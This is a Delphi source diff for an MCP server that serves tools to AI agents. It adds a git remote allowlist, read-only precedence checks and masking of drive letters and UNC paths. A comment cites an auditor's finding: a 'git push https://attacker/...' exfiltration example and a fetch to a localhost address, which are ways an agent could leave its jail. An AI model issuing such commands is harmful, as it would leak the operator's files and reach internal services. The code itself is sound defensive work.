@@ -130,6 +130,10 @@ function AllowRemoteRun: Boolean;   // DELPHI_MCP_ALLOW_REMOTE_RUN / AllowRemote
   DELPHI_MCP_ALLOW_TESTS=1 or [Security] AllowTests=1. }
 function AllowTests: Boolean;      // DELPHI_MCP_ALLOW_TESTS / AllowTests=1
 
+{ Host names git may talk to when an agent writes an explicit URL, comma
+  separated; '' (the default) means none - see GitRemoteDenied. }
+function GitRemoteHosts: string;   // DELPHI_MCP_GIT_REMOTES / GitRemotes=
+
 { Whether the READ-ONLY library zone exists at all. Default True (reading the
   RTL and the installed components is what makes an agent competent here).
   [Security] LibraryZone=0 cuts it: reads are then confined to the workspace
@@ -200,6 +204,24 @@ function ExpandIdeMacros(const AText: string; AVars: TStrings): string;
   arguments that end up on a paclient/msbuild command line. }
 function ShellArgDenied(const AText: string): string;
 
+{ Whether a git argument names a remote the operator has NOT allowed.
+
+  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
+  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
+  connection to that address, and `push https://attacker/... HEAD:main` would
+  have walked the jail's contents out of the building. The agent's universe is
+  supposed to end at the jail; an arbitrary outbound URL turns the server into
+  a proxy into its own network (localhost, internal services, metadata
+  endpoints) and into an exfiltration channel.
+
+  So: an EXPLICIT url in a git argument must match [Security] GitRemotes, a
+  comma-separated list of host names the operator wrote down. With that
+  setting empty - the default - explicit URLs are refused outright. The remotes
+  the OPERATOR configured in the repository keep working untouched (`push
+  origin main` names a remote, not a URL): the decision about where this
+  machine may talk to belongs to whoever owns the machine. }
+function GitRemoteDenied(const AText: string): string;
+
 implementation
 
 uses
@@ -225,6 +247,7 @@ var
   GAllowRemoteRun: Boolean = False; // remote-run is OFF unless opted in
   GLibraryZone: Boolean = True;     // the read-only library zone, on by default
   GAllowTests: Boolean = False;     // running test suites is opt-in too
+  GGitRemotes: string = '';         // hosts an explicit git URL may name
   GRemoteProjects: TArray<string>;  // [Security] RemoteRunProjects, '' = any
   GAllowBuildScripts: Boolean = False; // build scripts OFF unless explicitly opted in
   GAdbDevices: TArray<string>;      // [Adb] AllowedDevices - the allowlist
@@ -275,6 +298,7 @@ begin
   GAllowRemoteRun := GetEnvironmentVariable('DELPHI_MCP_ALLOW_REMOTE_RUN') = '1';
   GLibraryZone := GetEnvironmentVariable('DELPHI_MCP_LIBRARY_ZONE') <> '0';
   GAllowTests := GetEnvironmentVariable('DELPHI_MCP_ALLOW_TESTS') = '1';
+  GGitRemotes := GetEnvironmentVariable('DELPHI_MCP_GIT_REMOTES');
   GAllowBuildScripts := GetEnvironmentVariable('DELPHI_MCP_ALLOW_BUILD_SCRIPTS') = '1';
   IniPath := TPath.Combine(TPath.GetDirectoryName(ParamStr(0)), 'settings.ini');
   if TFile.Exists(IniPath) then
@@ -295,6 +319,8 @@ begin
         GLibraryZone := Ini.ReadBool('Security', 'LibraryZone', True);
       if not GAllowTests then
         GAllowTests := Ini.ReadBool('Security', 'AllowTests', False);
+      if GGitRemotes = '' then
+        GGitRemotes := Ini.ReadString('Security', 'GitRemotes', '');
       GRemoteProjects := Ini.ReadString('Security', 'RemoteRunProjects', '')
         .Split([';'], TStringSplitOptions.ExcludeEmpty);
       if not GAllowBuildScripts then
@@ -349,6 +375,12 @@ function AllowTests: Boolean;
 begin
   LoadSecurity;
   Result := GAllowTests;
+end;
+
+function GitRemoteHosts: string;
+begin
+  LoadSecurity;
+  Result := GGitRemotes.Trim;
 end;
 
 function RemoteRunProjectDenied(const APath: string): string;
@@ -519,6 +551,61 @@ begin
        T.StartsWith('--git-dir') or T.StartsWith('--work-tree') or // redirect where git operates -> jail escape
        (T = '-o') or T.StartsWith('-o=') or T.StartsWith('-o/') or T.StartsWith('-o\') then
       Exit(Format(SR_GIT_OPTION_FMT, [Tok]));
+  end;
+end;
+
+{ Host of a git URL, '' when the token is not a URL at all. Understands the
+  two shapes git takes: scheme://[user@]host[:port]/... and the scp-like
+  [user@]host:path. }
+function GitUrlHost(const AToken: string): string;
+var
+  T: string;
+  P: Integer;
+begin
+  Result := '';
+  T := AToken.Trim.Trim(['"', '''']);
+  P := Pos('://', T);
+  if P > 0 then
+    T := Copy(T, P + 3, MaxInt)
+  else if (Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T)) then
+    T := Copy(T, Pos('@', T) + 1, MaxInt)
+  else
+    Exit; // not a URL: a branch, a path, an option
+  P := Pos('@', T);
+  if P > 0 then
+    T := Copy(T, P + 1, MaxInt);
+  for P := 1 to Length(T) do
+    if CharInSet(T[P], ['/', ':', '\']) then
+    begin
+      T := Copy(T, 1, P - 1);
+      Break;
+    end;
+  Result := T.Trim.ToLower;
+end;
+
+function GitRemoteDenied(const AText: string): string;
+var
+  Tok, Host, Allowed: string;
+  Ok: Boolean;
+begin
+  Result := '';
+  for Tok in AText.Split([' ', #9], TStringSplitOptions.ExcludeEmpty) do
+  begin
+    Host := GitUrlHost(Tok);
+    if Host = '' then
+      Continue;
+    Allowed := GitRemoteHosts;
+    if Allowed = '' then
+      Exit(Format(SR_GIT_REMOTE_OFF_FMT, [Host]));
+    Ok := False;
+    for var H in Allowed.Split([',', ';'], TStringSplitOptions.ExcludeEmpty) do
+      if SameText(H.Trim, Host) then
+      begin
+        Ok := True;
+        Break;
+      end;
+    if not Ok then
+      Exit(Format(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
   end;
 end;
 
@@ -785,7 +872,13 @@ end;
 procedure ApplyArgAliases(const AToolName: string; AArguments: TJSONObject);
 const
   // tool, alias, real
-  Aliases: array [0 .. 10, 0 .. 2] of string = (
+  Aliases: array [0 .. 13, 0 .. 2] of string = (
+    // "path" is what almost every other tool calls it; delphi_list calls it
+    // "root" and delphi_projects too. Each spelling cost a wasted call
+    // (measured 2026-08-25), and the fix is free: accept both.
+    ('delphi_list', 'path', 'root'),
+    ('delphi_list', 'dir', 'root'),
+    ('delphi_projects', 'path', 'root'),
     ('vault_search', 'query', 'pattern'),
     ('vault_search', 'filter', 'pattern'),
     ('delphi_list', 'filter', 'pattern'),
@@ -846,6 +939,27 @@ begin
   ExpandVirtualDrives(AArguments);
   ApplyArgAliases(AToolName, AArguments);
   Result := '';
+  // Read-only comes FIRST for the tools it refuses outright. The argument
+  // filters below are universal on purpose, but letting one of them answer
+  // first meant a read-only server explained a git remote policy instead of
+  // saying the obvious thing: nothing writes here (v0.62).
+  if (GProcessReadOnly or GRequestReadOnly) and
+     MatchText(AToolName, ['delphi_edit', 'delphi_textedit', 'delphi_create',
+       'delphi_changeset', 'delphi_build', 'delphi_run', 'delphi_package',
+       'delphi_upload', 'delphi_delete', 'delphi_move',
+       'vault_append', 'vault_create', 'vault_patch']) then
+    Exit(WriteDenied(AToolName));
+  // ...and the same for the WRITING half of delphi_git: on a read-only server
+  // a clone has no business being explained in terms of remote policy.
+  if (GProcessReadOnly or GRequestReadOnly) and SameText(AToolName, 'delphi_git') then
+  begin
+    Cmd := ArgStr(AArguments, 'command');
+    if not (MatchText(Cmd, ['status', 'diff', 'log', 'show']) or
+            (MatchText(Cmd, ['branch', 'tag']) and
+             (Trim(ArgStr(AArguments, 'args')) = '') and
+             (Trim(ArgStr(AArguments, 'message')) = ''))) then
+      Exit(WriteDenied(Trim('delphi_git ' + Cmd)));
+  end;
   // Universal git-argument filter (BOTH access levels): a dangerous option
   // would let even a read-write client escape the jail. The single place git
   // freeform args are vetted.
@@ -853,6 +967,14 @@ begin
   begin
     GitArgs := ArgStr(AArguments, 'args');
     Result := GitArgDenied(GitArgs);
+    if Result <> '' then
+      Exit;
+    // An explicit URL anywhere in a git call is an outbound connection this
+    // machine is about to make. It goes through the operator's allowlist -
+    // args AND message, because clone carries the URL in the latter.
+    Result := GitRemoteDenied(GitArgs);
+    if Result = '' then
+      Result := GitRemoteDenied(ArgStr(AArguments, 'message'));
     if Result <> '' then
       Exit;
   end;
@@ -1510,7 +1632,14 @@ begin
     while I <= L do
     begin
       C := AText[I];
-      if (Pos(UpCase(C), Letters) > 0) then
+      // Any drive letter, not only the served ones. The mask was a C/D
+      // allowlist, so E:\secret\x.inc or z:\... walked out untouched
+      // (found 2026-08-25 by an auditor). Nothing real leaks on THIS machine
+      // today - only C: and D: exist and both are mapped - but a root on
+      // another drive, or a file referenced from one, would have. An
+      // unmapped letter travels as srvx: : the reader learns there is a path
+      // and learns nothing about where.
+      if CharInSet(UpCase(C), ['A' .. 'Z']) then
       begin
         if I = 1 then
           PrevC := #0
@@ -1533,7 +1662,10 @@ begin
           if (I + 2 <= L) and (AText[I + 1] = ':') and
              CharInSet(AText[I + 2], ['\', '/']) then
           begin
-            Sb.Append('srv').Append(Char(Ord(UpCase(C)) + 32)).Append(':');
+            if Pos(UpCase(C), Letters) > 0 then
+              Sb.Append('srv').Append(Char(Ord(UpCase(C)) + 32)).Append(':')
+            else
+              Sb.Append('srvx:'); // a drive this server does not serve
             Inc(I, 2);
             Continue;
           end;
@@ -1542,12 +1674,45 @@ begin
           if (I + 4 <= L) and (AText[I + 1] = '%') and (AText[I + 2] = '3') and
              ((AText[I + 3] = 'A') or (AText[I + 3] = 'a')) and (AText[I + 4] = '/') then
           begin
-            Sb.Append('srv').Append(Char(Ord(UpCase(C)) + 32))
-              .Append(AText[I + 1]).Append(AText[I + 2]).Append(AText[I + 3]);
+            if Pos(UpCase(C), Letters) > 0 then
+              Sb.Append('srv').Append(Char(Ord(UpCase(C)) + 32))
+            else
+              Sb.Append('srvx');
+            Sb.Append(AText[I + 1]).Append(AText[I + 2]).Append(AText[I + 3]);
             Inc(I, 4);
             Continue;
           end;
         end;
+      end;
+      // form C - a UNC path, whose HOST names the machine and what it can
+      // see. Two shapes, and both have to be told apart from an ordinary
+      // separator: by the time this runs the text is usually JSON, where a
+      // single \ is written \\ - so "C:\\Users" is NOT a UNC, and a first
+      // attempt at this rule happily turned it into "srvc:\srvhost" and ate
+      // the rest of the path (caught by the battery, same day).
+      //   raw text: \\host\share   - two, after a delimiter, then a letter
+      //   inside JSON: \\\\host   - four, then a letter
+      if (C = '\') and (I + 4 <= L) and (AText[I + 1] = '\') and
+         (AText[I + 2] = '\') and (AText[I + 3] = '\') and
+         CharInSet(AText[I + 4], ['A'..'Z', 'a'..'z', '0'..'9']) and
+         ((I = 1) or (AText[I - 1] <> '\')) then
+      begin
+        Sb.Append('\\\\srvhost');
+        Inc(I, 4);
+        while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
+          Inc(I);
+        Continue;
+      end;
+      if (C = '\') and (I + 2 <= L) and (AText[I + 1] = '\') and
+         CharInSet(AText[I + 2], ['A'..'Z', 'a'..'z', '0'..'9']) and
+         ((I = 1) or CharInSet(AText[I - 1],
+            [' ', #9, '"', '''', '(', ',', '=', #10, #13])) then
+      begin
+        Sb.Append('\\srvhost');
+        Inc(I, 2);
+        while (I <= L) and not CharInSet(AText[I], ['\', '/', '"', ' ', #9]) do
+          Inc(I);
+        Continue;
       end;
       Sb.Append(C);
       Inc(I);
